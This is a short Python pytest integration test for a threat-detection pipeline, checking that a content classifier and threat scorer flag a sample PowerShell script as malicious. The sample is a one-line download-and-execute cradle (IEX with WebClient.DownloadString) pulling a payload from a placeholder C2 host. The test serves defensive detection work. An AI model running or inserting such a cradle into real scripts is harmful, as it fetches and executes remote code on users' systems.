import pytest
import asyncio
from backend.core.classifier import ContentClassifier
from shared_lib.threat_scorer import ThreatScoringEngine, ThreatLevel

@pytest.mark.integration
def test_pipeline_classification_to_threat():
    # Simulate Stage 1 -> Stage 2 data flow
    classifier = ContentClassifier()
    scorer = ThreatScoringEngine()
    
    filename = "suspicious_script.ps1"
    content = "function backdoor { IEX (New-Object Net.WebClient).DownloadString('http://c2.com/payload') }"
    
    # 1. Classify
    cls_result = classifier.classify(filename, content)
    assert cls_result.data_type.value in ("code", "attack_artifact")
    
    # 2. Threat Score using classifier confidence
    threat_result = scorer.score(filename, content, cls_result.confidence)
    assert threat_result.level == ThreatLevel.MALICIOUS
    assert threat_result.ioc_allowed is True
    # Action verbs + Exploit context + System target might trigger mitre_allowed
